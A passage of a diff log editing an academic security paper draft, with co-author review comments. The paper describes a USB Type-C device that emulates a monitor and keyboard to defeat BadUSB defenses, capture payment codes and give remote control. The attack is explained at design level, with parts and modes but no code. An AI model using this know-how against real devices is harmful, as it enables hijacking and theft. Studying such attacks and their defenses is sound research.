-	\label{fig:usb_c_conn}
-\end{figure}
 
-Thus, in order to provide support towards a wider range of peripherals, a 24-pins standard called USB Type-C is introduced in 2013 by USB-IF.
-As it is designed to be double-sided, the number of actual usable pins is halved.
-Nevertheless, this standard has largely enhanced the capability of USB 3.x protocol.
-As presented in Figure~\ref{fig:usb_c_conn}, Type-C added two high speed data lanes (TRX1 \& TRX2) and kept the original data lane (D+ \& D-).
-The added lanes are used exclusively to support peripherals like DisplayPort while the kept data lane transfers USB packets.
+As illustrated in Figure~\ref{fig:usb_conn}, the original USB 1.x \& 2.x
+connector only has two pins for data transferring (D+ \& D-), which has
+significantly limited data transfer rate (5 Gbits/s Max) and support for
+peripheral like DisplayPort (10.8 Gbit/s Min). Apart from that, support for
+other peripheral also requires dedicated transferring lane as their standards
+are not compatible with USB in most cases.  \begin{figure}[t] \centering
+\includegraphics[width=\linewidth]{./Figs/usb_c_conn.png} \caption{USB Type C
+Connector} \label{fig:usb_c_conn} \end{figure}
+
+Thus, to provide support towards a wider range of peripherals, a 24-pins
+standard called USB Type-C is introduced in 2013 by USB-IF\fengwei{Need a
+citation}. As it is designed to be double-sided, the number of actual usable
+pins is halved. Nevertheless, this standard has largely enhanced the capability
+of USB 3.x protocol. As presented in Figure~\ref{fig:usb_c_conn}, Type-C added
+two high speed data lanes (TRX1 \& TRX2) and kept the original data lane (D+ \&
+D-). The added lanes are used exclusively to support peripherals like
+DisplayPort while the kept data lane transfers USB packets.
 
 %\noindent\outline{Security Problem}\\
-During the development of USB specification, security was rarely considered.
-As the USB-IF believes it is the duty of original equipment manufacturers (OEMs) to decide whether security features should be implemented.\hongyi{Citation needed}.
-But the divergent implementations give a chance for attack like BadUSB\cite{rubber} and our \tool.
+During the development of USB specification, security was rarely considered. As
+the USB-IF believes it is the duty of original equipment manufacturers (OEMs)
+to decide whether security features should be implemented.\hongyi{Citation
+needed}. But the divergent implementations give a chance for attack like
+BadUSB~\cite{rubber} and our \tool.
 
+\fengwei{FIXME: add a reference for each attack in the Table.}
 \begin{table*}
@@
 	\hline
-	2013 & USB 3.1 & HDMI, DisplayPort, ThunderBolt... & 10 Gbit/s & Armory \\
+	2013 & USB 3.1 & HDMI, DisplayPort, ThunderBolt... & 10 Gbit/s & \tool \\
 	\hline

### 2021-01-27 WOOT/Files/related_work.tex
pass on Related Work. This section needs more work.

@@
 
-In this part, we survey related works on USB attack in Section~\ref{subsec:usb_attack}, and USB defence security in Section \ref{subsec:usb_defence}, respectively.
+We survey related works on USB attack in Section~\ref{subsec:usb_attack} and
+USB security defense in Section~\ref{subsec:usb_defence}, respectively.
 
@@
 \chaozu{DoS(Fuzzing), Code injection, HID emulation, JFC, our work}
-During the development of USB protocol, there are many USB-based attacks were proposed, ranging from DoS (denial of service) to protocol masquerading.
-Here we will introduce them following an order of their category.\hongyi{What?}
+\fengwei{Related work section needs to be improved. Many typos and grammar mistakes can be found.}
 
-From the kernel perspective, its USB software stack generally expects devices to follow the USB standard and may not consider corner cases of malformed USB packets.
-Based on this, Facedancer\cite{facedancer} and Syzkaller\cite{syzkaller} uses fuzzing technique to uncover the bugs lying in the kernel drivers.
-These bugs can cause kernel crash and lead to a DoS situation.
-Though this poses a great challenge to the availability of a system, this attack still requires physical access to the host and is unable to cause more damage other than DoS.
+During the development of USB protocol, many USB-based attacks were proposed,
+ranging from DoS (Denial of Service) to protocol masquerading.
 
-In the field of USB security, protocol masquerading is also a widely used attack scheme.
-Due to the lack of authentication in USB protocol, malicious devices can hide their real functionality with re-written firmware\cite{rubber,badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver}.
-These works rewrite the firmware of a normal-looking flash drive, which allows it to pretend as other devices.
-When these modified drives are connected to the host, they will be recognized as keyboard or mouse.
-Then the attacker can execute malicious payloads as they were using the victim's devices.
-But due to the limitation of USB 2.0\cite{usb20} protocol, these BadUSB attacks are unable to obtain video feedback from the victim as video were not supported until USB 3.0 \cite{usb30}.
-Though USB 2.0 does not support video transmission, there exists a protocol called MHL(Mobile High-Definition Link) which extends the USB standard and allow video signal to be transmitted through USB interface.
-JFC\cite{JFC}, short for juicy filming charging is such a work which abuses this standard and exfiltrate video data from victim without permission.
-But in JFC, this data exfiltration is not combined with BadUSB attacks and MHL is an outdated standard, which limits its capability.
+%Attacks against USB kernel drivers
+From the kernel perspective, its USB software stack generally expects devices
+to follow the USB standard and may not consider corner cases of malformed USB
+packets. Based on this, Facedancer~\cite{facedancer} and
+Syzkaller~\cite{syzkaller} use fuzzing techniques to uncover the bugs lying in
+the kernel drivers. These bugs can cause kernel crash and lead to a DoS attack.
+Though this poses a great challenge to the availability of a system, this
+attack still requires physical access to the host and is unable to cause more
+damage other than DoS.
 
-Besides attacking from the protocol perspective, there are works trying to use USB device as a payload delivery means.
-Duqu\cite{duqu} uses a user-mode rootkit to hide malicious files on the USB storage device, \cite{flame} uses a zero-day exploit and malicious \textit{autorun.inf} to execute the malware automatically.
-There are also works like \cite{brain, stuxnet, conficker} following the same paradigm and performing code-injection attacks.
-These attacks are much more damaging and flexible comparing to those previous ones, but they requires certain existing flaw like \cite{zero-day} and USB are merely a payload delivery method.
+% USB protocol attacks
+In the field of USB security, protocol masquerading is also a widely used
+attack scheme. Due to the lack of authentication in the USB protocol, malicious
+devices can hide their real functionality with re-written
+firmware~\cite{rubber,badusb,rubberducky2020,usbbypassing,iseeyou,usbdriver}.
+These works rewrite the firmware of a normal-looking flash drive, which allows
+it to pretend as other devices. When these modified drives are connected to the
+host, they could be recognized as keyboard or mouse. Then the attacker can
+execute malicious payloads as they were using the victim's devices. Due to the
+limitation of USB 2.0~\cite{usb20} protocol, these BadUSB
+attacks\fengwei{reference?} are unable to obtain video feedback from the victim
+as video were not supported until USB 3.0~\cite{usb30}. Though USB 2.0 does not
+support video transmission, there exists a protocol called MHL (Mobile
+High-Definition Link) which extends the USB standard and allow video signal to
+be transmitted through USB interface. JFC~\cite{JFC}, short for juicy filming
+charging is such a work which abuses this standard and exfiltrate video data
+from victim without permission. But in JFC, this data exfiltration is not
+combined with BadUSB attacks and MHL is an outdated standard, which limits its
+capability.
 
-As a data transmission protocol, USB inevitably leaks electromagnetic signals to the environment which may contains sensitive information.
-Leveraging this physical phenomenon, there are works like \cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver} eavesdropping leaked signals and recovering the sensitive data.
-In a similar fashion, \cite{usbee, turnip} emit electromagnetic emissions by data injection on the bus with the connected USB devices as a RF transmitter and \cite{usbkiller, cable} inject analog power to cause physical damage to the host machine.
-Even though the data, including the video data, could be recovered in this way, these attacks for executing malicious code is too difficult to work, and the invisibility is a problem cannot be ignored due to the spacial locality of radio frequency.
+% Using USB devices to inject code
+Besides attacking from the protocol perspective, there are works trying to use
+USB device as a payload delivery means. Duqu~\cite{duqu} uses a user-mode
+rootkit to hide malicious files on the USB storage device, \cite{flame} uses a
+zero-day exploit and malicious \textit{autorun.inf} to execute the malware
+automatically. There are also works like \cite{brain, stuxnet, conficker}
+following the same paradigm and performing code-injection attacks. These
+attacks are much more damaging and flexible comparing to those previous ones,
+but they requires certain existing flaw like \cite{zero-day} and USB is merely
+a payload delivery method.
 
-Since USB 3.1 was introduced with USB Type-C in 2013, display port and HDMI connectors have been provided by USB Type-C, transferring of video data can be combined with the other attacks, like protocol masquerading,  protocol corruption and code injection.
-This has paved the path for our \tool.
+% Using USB for information leakage
+As a data transmission protocol, USB inevitably leaks electromagnetic signals
+to the environment which may contains sensitive information. Leveraging this
+physical phenomenon, previous works~\cite{smartphone,
+poweremi,revealing,su2017usb,usbgpslocator,bates2014leveraging,badusbhub,usbfinger,side,usbdriver}
+eavesdrop leaked signals and recover the sensitive data. In a similar fashion,
+\cite{usbee,turnip} emit electromagnetic emissions by data injection on the bus
+with the connected USB devices as a RF transmitter and \cite{usbkiller,
+cable}\fengwei{we don't need to have space between references} inject analog
+power to cause physical damage to the host machine. Even though the data,
+including the video data, could be recovered in this way, these attacks for
+executing malicious code is too difficult to work, and the invisibility is a
+problem cannot be ignored due to the spacial locality of radio frequency.
+
+Since USB 3.1 was introduced with USB Type-C in 2013, display port and HDMI
+connectors have been provided by USB Type-C, transferring of video data can be
+combined with the other attacks, like protocol masquerading,  protocol
+corruption and code injection. This has paved the path for our \tool.
 
@@
 \label{subsec:usb_defence}
-There are already many defenses proposed against BadUSB attacks and a comprehensive investigation of previous work.\cite{sok}.
+Many defenses have been proposed to defend against BadUSB attacks~\cite{sok}.
 
-From the hardware perspective, BadUSB attack requires `D-' and `D+' pins which are defined by protocol to transmitting data.
-Without these pins, data can't be transferred via USB cable.
-Based on this fact, USB Condom \cite{Condom} is a hardware solution to block data channel by adding blocker in the connector.
-This blocker can cut off the `D-' and `D+' connection while leave power pins intact.
-However, this method poses a great challenge to plug-and-play property of USB, as once it is deployed, it will stop all USB functions other than charging.
+From the hardware perspective, BadUSB attack requires `D-' and `D+' pins which
+are defined by protocol to transmitting data.  Without these pins, data can't
+\fengwei{use "cannot" instead of "can't"} be transferred via USB cable. Based
+on this fact, USB Condom \cite{Condom} is a hardware solution to block data
+channel by adding blocker in the connector. This blocker can cut off the `D-'
+and `D+' connection while leave power pins intact.  However, this method poses
+a great challenge to plug-and-play property of USB, as once it is deployed, it
+stops all USB functions other than charging.
 
-Under the premise of ensuring the full functionality of USB devices, there have been some works trying to improve the security during connection establishment.
-Windows Defender ATP\cite{windenfenderwhite} maintains a whitelist of USB devices, only devices on the whitelist are allowed to communicate with the host.
-This prevents all potential attacks from untrusted devices.
-But this requires users to have a certain safety awareness and technical background to maintain a valid whitelist.
-For example, a naive user may add the USB device from unknown sources to his/her whitelist without precaution.
-There are designs can overcome this drawback.
-For instance, Mohammadmoradi et al.\cite{mohammadmoradi2018making} proposes a strategy to generate such a whitelist automatically.
-This strategy first generates a unique fingerprint for each device based on its functionality.
-Then these fingerprints are used to maintain a safe and valid whitelist of USB devices.
-There is another work mediating USB connectivity for Industrial Control.
-TMSUI\cite{yang2015tmsui} relies on rich experience of administrators to build a whitelist.
-However, some modified USB devices may hide their real functionality from the user.
+Under the premise of ensuring the full functionality of USB devices, some works
+try to improve the security during connection establishment.  Windows Defender
+ATP~\cite{windenfenderwhite} maintains a whitelist of USB devices, only devices
+on the whitelist are allowed to communicate with the host. This prevents all
+potential attacks from untrusted devices. But this requires users to have a
+certain safety awareness and technical background to maintain a valid
+whitelist. For example, a naive user may add the USB device from unknown
+sources to his/her whitelist without precaution. There are designs can overcome
+this drawback. For instance, Mohammadmoradi et
+al.\cite{mohammadmoradi2018making} propose a strategy to generate such a
+whitelist automatically. This strategy first generates a unique fingerprint for
+each device based on its functionality. Then these fingerprints are used to
+maintain a safe and valid whitelist of USB devices. There is another work
+mediating USB connectivity for Industrial Control. TMSUI~\cite{yang2015tmsui}
+relies on rich experience of administrators to build a whitelist. However, some
+modified USB devices may hide their real functionality from the user.
 
-To solve this flaw, GoodUSB\cite{tian2015defending} will report the functionality claimed by the device to user and let user decides whether to authorize.
-When a device is plugged in, GoodUSB will load its driver but limit its functionality until a series of authorizations is completed.
-These authorizations are designed to be performed manually.
-As BadUSB is normally unable to obtain the video stream of the host, it is impossible for an attacker to complete these authorization with automatic script.
-Thus this defense is sufficient for normal BadUSB attack.
-But if the attacker has the access to victim's screen, GoodUSB will be bypassed easily as the attacker can just complete these authorization manually and perform subsequent attacks.
+To solve this flaw, GoodUSB~\cite{tian2015defending} will\fengwei{Don't use
+future tense. We can just use present tense.} report the functionality claimed
+by the device to user and let user decides whether to authorize. When a device
+is plugged in, GoodUSB will load its driver but limit its functionality until a
+series of authorizations is completed. These authorizations are designed to be
+performed manually. As BadUSB is normally unable to obtain the video stream of
+the host, it is impossible for an attacker to complete these authorization with
+automatic script. Thus this defense is sufficient for normal BadUSB attack. But
+if the attacker has the access to victim's screen, GoodUSB will be bypassed
+easily as the attacker can just complete these authorization manually and
+perform subsequent attacks.
 
-After the USB enumeration and driver loading, there are also works trying to archive `defense in depth' against BadUSB attack.
-Neuner et al.\cite{neuner2018usblock} prevents BadUSB attacks from malicious flash drive by analyzing the temporal characteristics of BadUSB-like attacks.
-This defense mechanism is effective because the attacker cannot obtain the screen of the host using just BadUSB.
-In this case, the malicious device can only inject key stoke in a very short time to reduce the risk of being discovered.
-This defect causes the typing characteristics of BadUSB to be detectable.
-Pham et al.
-\cite{pham2010optimizing} optimizing windows security features.
-It can block the execution of unsigned files, the installation of unsigned driver carried on portable media.
-What's more, in GoodUSB, a VM is deployed in host to as a honeypot to detect and stop malicious behavior of USB devices.
+After the USB enumeration and driver loading, there are\fengwei{I feel too many
+"there are" style sentences.} also works trying to archive `defense in depth'
+against BadUSB attack.  Neuner et
+al.~\cite{neuner2018usblock}\fengwei{Typicall, we add "~" to create a space for
+each citation.} prevents BadUSB attacks from malicious flash drive by analyzing
+the temporal characteristics of BadUSB-like attacks. This defense mechanism is
+effective because the attacker cannot obtain the screen of the host using
+BadUSB. In this case, the malicious device can only inject key stoke in a very
+short time to reduce the risk of being discovered. This defect causes the
+typing characteristics of BadUSB to be detectable. Pham et
+al.~\cite{pham2010optimizing} optimizing windows security features. It can
+block the execution of unsigned files, the installation of unsigned driver
+carried on portable media. Moreover, in GoodUSB, a VM is deployed in host to as
+a honeypot to detect and stop malicious behavior of USB devices.
 
-In addition to injection attacks, data theft attack is also one of the focuses of academic community.
-As mentioned in Section~\ref{subsec:usb_attack}, there exist an attack called JFC (juicy film charging)\cite{JFC} which abuses the MHL standard to steal video stream from the victim.
-In order to mitigate this issue, Meng et al.\cite{meng2018252} proposed a statistical model using status like GPU/CPU usage to detect JFC attack.
+In addition to injection attacks, data theft attack is also one of the focuses
+of academic community. As mentioned in Section~\ref{subsec:usb_attack}, there
+exist an attack called JFC (juicy film charging)\cite{JFC} which abuses the MHL
+standard to steal video stream from the victim. In order to mitigate this
+issue, Meng et al.\cite{meng2018252} proposed a statistical model using status
+like GPU/CPU usage to detect JFC attack.
 
-To summarize, there exists a clear trade-off between the effectiveness and the plug-and-play property.
-Though hardware disabling solution like USB Condom archives the almost absolute security, the functionality of USB is scarified.
-Other solutions like GoodUSB or whitelist are either bypassable or insufficient under certain cases.
-Some vendors may sacrifice defensive capabilities to improve usability, which allows attackers to take advantage of.
+To summarize, there exists a clear trade-off between the effectiveness and the
+plug-and-play property. Though hardware disabling solution like USB Condom
+archives the almost absolute security, the functionality of USB is scarified.
+Other solutions like GoodUSB or whitelist are either bypassable or insufficient
+under certain cases.  Some vendors may sacrifice defensive capabilities to
+improve usability, which allows attackers to take advantage of.
 
-We summarize the former effort in USB attack and defense in Table~\ref{table:attack_vs_defense}, which illustrates the effectiveness of each defense against various attacks including our \tool.
+We summarize the former effort in USB attack and defense in
+Table~\ref{table:attack_vs_defense}, which illustrates the effectiveness of
+each defense against various attacks including our \tool.
+
+\fengwei{The table exceeds the max size.}
 \newcommand{\circlefull}{\includegraphics[scale=0.025]{Figs/circle_full.png}}

### 2021-01-27 WOOT/Files/badusb.tex
[implementation] attack_model
pass on badusb

@@
 \subsection{Threat Model}
-We build our threat model on the basic assumptions that common users without technical background would not treat normal-looking USB device as highly dangerous and be cautious about them.
-These assumptions are approved in a relevant work about charging attack\cite{JFCImpact}.
-Moreover, we neglect the effect of notification about common USB device, as normal users usually are not equipped with the necessary knowledge to fully understand such notices.
-In fact, during our experiment, no device had security notifications raised about suspicious USB devices and only mobile devices had raised charging notification about our \tool, which is not a sufficient warning towards users.
 
-We also assume the victim's device is equipped with fully functional USB 3.x protocol and USB Type C connector.
-As the USB 3.x standard is more and more common nowadays, this assumption can be easily fulfilled especially in recent devices.
+We build our threat model on the basic assumptions that common users without
+technical background would not treat normal-looking USB device as highly
+dangerous and be cautious about them. These assumptions are approved in a
+relevant work about charging attack~\cite{JFCImpact}. Moreover, we neglect the
+effect of notification about common USB device, as normal users usually are not
+equipped with the necessary knowledge to fully understand such notices. In
+fact, during our experiment, no device had security notifications raised about
+suspicious USB devices and only mobile devices had raised charging notification
+about our \tool, which may not be a sufficient warning towards users.
+
+We also assume the victim's device is equipped with fully functional USB 3.x
+protocol and USB Type C connector. As the USB 3.x standard is more and more
+common nowadays, this assumption can be easily fulfilled especially in recent
+devices.
 
@@
 %\noindent\hongyi{The following mode is to be further decided}\\
-%\outline{DETAIL of each mode}\\
-%\outline{Automatic Scripting Mode}\\
-%\outline{Remote Control Mode}\\
-%\outline{OCR/QR Recognition Mode}\\
-As we introduced in Section~\ref{sec:related_work}, there are plenty of existing work~\cite{rubber,badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver} focusing on BadUSB attack. 
-Many of these take advantage of the \textit{trust-by-default} policy of PC, pretend to be normal HID devices and utilize USB protocol to perform attacks. 
-However, these attacks suffer from various drawbacks:
-\ding{182} attackers can only simulate limited types of devices such as HIDs (like keyboards and mice) and disks, which makes the attacks less effective;
-\ding{183} accurate attacks couldn't be performed due to lack of user interface (UI).
-Whatever HID the attackers simulate their USB devices to be, they couldn't obtain the UI to check the current situation, which makes it nearly impossible to carry out their attacks precisely or confirm the effects after attacks.
+%\outline{DETAIL of each mode}\\ \outline{Automatic Scripting Mode}\\
+%\outline{Remote Control Mode}\\ \outline{OCR/QR Recognition Mode}\\
+As we introduced in Section~\ref{sec:related_work}, there are plenty of
+existing work~\cite{rubber,badusb,
+rubberducky2020,usbbypassing,iseeyou,usbdriver} focusing on BadUSB attack.
+Many of these take advantage of the \textit{trust-by-default} policy of PC,
+pretend to be normal HID devices and utilize USB protocol to perform attacks.
+However, these attacks suffer from various drawbacks: \ding{182} attackers can
+only simulate limited types of devices such as HIDs (like keyboards and mice)
+and disks, which makes the attacks less effective; \ding{183} accurate attacks
+could not be performed due to lack of user interface (UI).  Whatever HID the
+attackers simulate their USB devices to be, they could not obtain the UI to
+check the current situation, which makes it nearly impossible to carry out
+their attacks precisely or confirm the effects after attacks.
 
-In this work, we utilized the new features of USB 3.x \cite{usb31} \cite{usb32} to address the problems above.
-Benefiting from latest protocol, we simulated external display and thus obtained the video stream to perform accurate attacks.
+In this work, we utilized the new features of USB 3.x~\cite{usb31,usb32} to
+address the problems above.  Benefiting from latest protocol, we simulated
+external display and thus obtained the video stream to perform accurate
+attacks.
 
-%Though BadUSB devices\cite{badusb} like Rubber Ducky\cite{rubber, rubberducky2020} emulates as a HID device enabling various arbitrary execution attacks, fetching feedback from the victim is much more limited.
-Based on the drawbacks introduced above, several defense mechanisms were proposed, like GoodUSB\cite{tian2015defending}.
-These defense mechanism implemented a CAPTCHA-like\cite{captcha} procedure, which requires user to complete certain challenges when a unknown HID device is plugged in.
-As the BadUSB is only able to emulate a limited kind of devices like HID or disks, by no means the BadUSB can bypass it.
-Our \tool, on the other hand, is capable of bypassing this type of defense.
-Taking advantage of USB 3.x\cite{usb31}\cite{usb32}, \tool can fetch the video stream of the victim and complete the challenge manually by the attacker.
-Moreover, with video capability combined with traditional BadUSB, our \tool achieved multiple new attack paradigm and are tested under various real-life scenarios.
+%Though BadUSB devices\cite{badusb} like Rubber Ducky\cite{rubber,
+%rubberducky2020} emulates as a HID device enabling various arbitrary execution
+%attacks, fetching feedback from the victim is much more limited. 
+Based on the drawbacks introduced above, several defense mechanisms were
+proposed, like GoodUSB~\cite{tian2015defending}. These defense mechanism
+implemented a CAPTCHA-like~\cite{captcha} procedure, which requires user to
+complete certain challenges when an unknown HID device is plugged in. As the
+BadUSB is only able to emulate a limited kind of devices like HID or disks, by
+no means the BadUSB can bypass it. Our \tool, on the other hand, is capable of
+bypassing this type of defense. Taking advantage of USB 3.x~\cite{usb31,usb32},
+\tool can fetch the video stream of the victim and complete the challenge
+manually by the attacker. Moreover, with video capability combined with
+traditional BadUSB, our \tool achieved multiple new attack paradigms and are
+tested under various real-world scenarios.
 
-As there were various BadUSB implementations available, we only focus on its core functionality and our extension.
-In this section, we first introduce the components we used in \tool, then we focus on the three different attack modes we implement  for different scenarios.
+As there were various BadUSB implementations available, we only focus on its
+core functionality and our extension. In this section, we first introduce the
+components we used in \tool, then we focus on the three different attack modes
+we implement for various scenarios.
 
 \subsubsection{Attack Model}
-The components in our attack model are as follows and the relation between them is illustrated at Fig.~\ref{fig:attack_model}
+
+The components in our attack model are as follows, and the relation between
+them is illustrated at Figure~\ref{fig:attack_model}. \fengwei{We need to
+explain the figure. What are the boxes? Where is victim? Where is the attacker?
+The list below only shows the internal components in the malicious USB device.
+We might also consider to explain this in the Figure caption.}
+
 \begin{itemize}
@@
 \end{itemize}
+
 \begin{figure}[t]
 	\centering
-	\includegraphics[width=0.56\linewidth]{./Figs/attack_model.png}
+	\includegraphics[width=\linewidth]{./Figs/attack_model.png}
 	\caption{Attack Model}%\shuqing{Need to be more compact.}
@@
 \end{figure}
-\textbf{Scripting Mode} This mode majorly relies on the ``HID Emulator'' to send constructed HID packet to the victim.
-These constructed HID packet will be interpreted by the victim as valid keystrokes and mouse moves.
-Thus the attacker can executes arbitrary scripts on the victim's device.
-This is the function of the original BadUSB.
-Based on this, we made the following improvement.
 
-First \tool supports defense mechanism bypass.
-As the original BadUSB cannot get feedback from the victim, defense mechanism like GoodUSB \cite{tian2015defending} is sufficient to prevent these BadUSB attack.
-But such defense mechanism needs visual notification to request authorization for unknown USB device.
-This means that when the defense request authorization from the user, our \tool is able to capture the content of authorization challenge and complete it.
-After the defense is bypassed, \tool continues the emulation and script execution, resulting a successful attack.
+\textbf{Scripting Mode.} This mode majorly relies on the ``HID Emulator'' to
+send constructed HID packet to the victim. These constructed HID packets are
+interpreted by the victim as valid keystrokes and mouse moves. Thus, the
+attacker can executes arbitrary scripts on the victim's device. This is the
+function of the original BadUSB. Based on this, we made the following
+improvement.
 
-Moreover, as the mouse relies on the visual feedback to work properly, its emulation and automation were not supported by the original version of BadUSB.
-Yet with the video output support from USB 3.x, our \tool implements full-functional mouse emulation.
-This function enables attacks toward pure GUI programs and showed great potential in mobile attack scenario.
-Details can be obtained in Section~\ref{sec:experiment}.
+First, \tool supports defense-bypassing. As the original BadUSB cannot get
+feedback from the victim, defense mechanisms like GoodUSB
+\cite{tian2015defending} are sufficient to prevent these BadUSB attacks.
+However, these defense mechanisms leverage visual notification to block access
+for unknown USB devices. This means that when the defense request authorization
+from the user, our \tool is able to capture the content of authorization
+challenge and bypass it. After the defense is bypassed, \tool continues the
+emulation and script execution, resulting in a successful attack.
 
-The advantage of this mode is that it archives defense bypass and attack feedback with low overhead.
-As mentioned above, we only require video stream at the begin(defense bypass) and the end(result feedback) of the attack.
-Moreover, with mouse supported, \tool extends the original BadUSB attack surface and perform well in mobile device.
+Moreover, as the mouse relies on the visual feedback to work properly, its
+emulation and automation were not supported by the original version of BadUSB.
+Yet with the video output support from USB 3.x, our \tool implements
+full-functional mouse emulation. This function enables attacks toward pure GUI
+programs and shows great potential in the mobile attack scenario. Details can
+be obtained in Section~\ref{sec:experiment}.
 
-\textbf{Privacy Extraction Mode}
-\tool under this mode does not emulate other USB device and solely relies on the video stream function of USB 3.x and use ``Video Capture'' component to transmit the stream to the embedded computer.
-The victim's device will mistakenly treat \tool as a external monitor and try to output its video stream.
-This stream is latter processed by the embedded computer to extract private data.
+The advantage of this mode is that it archives defense bypass and attack
+feedback with low overhead.  \fengwei{I don't understand the sentence below.}
+As mentioned above, we only require video stream at the beginning (defense
+bypass) and the end (result feedback) of the attack. Moreover, with mouse
+supported, \tool extends the original BadUSB attack surface and perform well in
+mobile device.
 
-When running in this mode, \tool passively process the victim's video stream and detect for ``valuable'' private data.
-Here, a data is ``valuable'' or not is decided by a customized detector, we implement a simple payment code detector for demonstration purpose.
-Though this detector is simple to implement, we successfully transfer money from the victim.
-More detail can be obtained in Section~\ref{sec:experiment}.
+\textbf{Privacy Extraction Mode.} \tool under this mode does not emulate other
+USB device and solely relies on the video stream function of USB 3.x; it uses
+``Video Capture'' component to transmit the stream to the embedded
+computer\fengwei{What is embedded computer? Do we define this in the previous
+text?}. The victim's device would mistakenly treat \tool as an external monitor
+and output its video stream. This stream is latter processed by the embedded
+computer to extract private data.
 
-It is worth mentioning that \tool under this mode is completely passive, making it hard to be detected and defended.
-With different detector implemented, \tool under this mode is capable of serving more purpose.
+When running in this mode, \tool passively processes the victim's video stream
+and detect for ``valuable'' private data.  The data is considered as
+``valuable'' or not is decided by a customized detector, we implement a simple
+payment code detector for the demonstration purpose. Though this detector is
+simple to implement, we successfully transfer money from the victim to the
+attacker. More detail can be obtained in Section~\ref{sec:experiment}.
 
-\textbf{Remote Control Mode}
-In \tool, we have implemented all components required to control a computer/mobile remotely, including a video stream and a keyboard/mouse emulation.
-Thus with all components enabled, not only will the victim's device treat \tool as a external display, but also a valid HID input source.
-Hence we can archive complete hijack of victim's device.
+It is worth mentioning that \tool under this mode is completely passive, making
+it hard to be detected and defended. With different detector implemented, \tool
+under this mode is capable of serving more purposes.
 
-\tool under this mode follows a simple logic.
-\tool will receive video stream from the victim's device and redirect it to the attacker via GSM/WiFi.
-In the meanwhile, \tool also receives keystrokes and mouse movement from the attacker through GSM/WiFi and replay them to the victim by USB emulation.
+\textbf{Remote Control Mode.} In \tool, we have implemented all components
+required to control a computer/mobile device remotely, including a video stream
+and a keyboard/mouse emulation. Thus with all components enabled, not only will
+the victim's device treat \tool as an external display, but also a valid HID
+input source. Hence we can archive complete hijack of victim's device.
 
-This mode enable attacker to perform delicate operation that is beyond automation.
-Moreover, this mode provides a backdoor that does not require host network and thus is undetectable by the firewall running on the host machine.
-%\hongyi{I think this is a quite good selling point?}\shuqing{Agree with Hongyi.}
+\tool under this mode follows a simple logic. \tool will receive video stream
+from the victim's device and redirect it to the attacker via GSM/WiFi. In the
+meanwhile, \tool also receives keystrokes and mouse movement from the attacker
+through GSM/WiFi and replay them to the victim by the USB emulation.
 
-The advantage of this mode is that it can completely hijack the victim device and provide a backdoor beyond detection of firewalls.
-But this complete control also comes with the price of high power consumption and risk of being detected by the user.
+This mode enable attacker to perform delicate operation that is beyond
+automation. Moreover, this mode provides a backdoor that does not require host
+network and thus is undetectable by the firewall running on the host machine.
+%\hongyi{I think this is a quite good selling point?}\shuqing{Agree with
+%Hongyi.}
+
+The advantage of this mode is that it can completely hijack the victim device
+and provide a backdoor beyond detection of firewalls. But this complete control
+also comes with the price of high power consumption and risk of being detected
+by the user.

### 2021-01-27 WOOT/Files/experiment.tex
part of the experiments.

@@
 %\shuqing{Experiment for devices and case study needed.}
-To evaluate the effectiveness of \tool in different modes, we conducted three experiments on \tool using devices with USB Type-C capabilities from different OEMs, including a mobile phone, a tablet and a laptop.
+To evaluate the effectiveness of \tool in different modes, we conducted three
+experiments on \tool using devices with USB Type-C capabilities from different
+OEMs, including a mobile phone, a tablet, and a laptop.
 
-\textit{Setup.} As mentioned in Section~\ref{sec:badusb}, our \tool only requires common components that are easily accessible online or in any electronic store.
-Here we choose the following parts to build a prototype.
-To begin with, we choose the Raspberry Pi 4B as the embedded computer inside \tool, which is powerful enough to process video data and has onboard WiFi chip.
-As for the HID emulator, we decide to use a ATMEGA32U4 board with USB protocol support.
-This Atmel chip is able to emulate most HID devices with our modified firmware.
-About the USB 3.x hub, we uses one from the Yamazawa, which supports HDMI, USB 2.0, and many other exported peripheral.
-Apart from these essential parts, we also uses an auxiliary power-bank to provide power for the Raspberry Pi and the mobile devices used by the victim.
+\textit{Setup.} \fengwei{I would suggest to add references for devices such as
+Pi, ATMEGA32U4 board, Yamazawa, etc.} As mentioned in Section~\ref{sec:badusb},
+our \tool only requires common components that are easily accessible online or
+in any electronic store. Here we choose the following parts to build a
+prototype. To begin with, we choose the Raspberry Pi 4B as the embedded
+computer inside \tool, which is powerful enough to process video data and has
+onboard WiFi chip. As for the HID emulator, we decide to use a ATMEGA32U4 board
+with USB protocol support. This Atmel chip is able to emulate most HID devices
+with our modified firmware. About the USB 3.x hub, we uses one from the
+Yamazawa, which supports HDMI, USB 2.0, and many other exported peripheral.
+Apart from these essential parts, we also uses an auxiliary power-bank to
+provide power for the Raspberry Pi and the mobile devices used by the victim.
 The image of our prototype \tool can be found in Figure~\ref{fig:armory}.
+\fengwei{We need to explain the Figure. What is "A"? What is "B", Where are 1,
+2, 3, 4, and 5?}
 
@@
 \end{figure}
+
 \subsection{Scripting mode}
-In the experiment of scripting mode, we used \textit{Lenovo Xiaoxin Pro 13 2020}, a PC in Windows 10/Ubuntu OS with two USB Type-C interfaces as target device.
-During this experiment, \tool disguised itself as a normal keyboard and a home-brewed version of GoodUSB\cite{tian2015defending} is deployed to test the defense bypassing.
-We have tried to deploy the original GoodUSB on the target device, but as the GoodUSB is proposed in 2015 and the code is too outdated to run at modern OS.
-We have to home-brew a similar defense mechanism according to its paper.
-At the beginning, our home-brewed version of GoodUSB asked victim to manually complete a CAPTCHA to  authorize the new USB device, a.k.a our \tool.
-But at this time, by the design of GoodUSB, our \tool can already perform limited keystroke to complete the CAPTCHA and will be rejected only after the failure of authorization.
-With the video feedback from \tool, the attacker successfully completes the CAPTCHA.
-Up to this point, the bypass of defense like GoodUSB is completed as our \tool already gain full function from the GoodUSB and become a trusted device.
-Then, our \tool works similar to the original BadUSB, inserting keystroke to perform arbitrary execution on the laptop.
-We tested three scripts, ranging from reverse shell backdoor to malware payload execution, all of which resulting in success.
 
-With this experiment, we have proven the defense bypassing is possible using \tool. This also warned us that we need more thorough defense against such BadUSB attack.
+In the experiment of scripting mode, we used \textit{Lenovo Xiaoxin Pro 13
+2020}, a PC in Windows 10/Ubuntu OS with two USB Type-C interfaces as the
+target device.  During this experiment, \tool disguised itself as a normal
+keyboard and a home-brewed version of GoodUSB~\cite{tian2015defending} is
+deployed to test the defense bypassing. We have tried to deploy the original
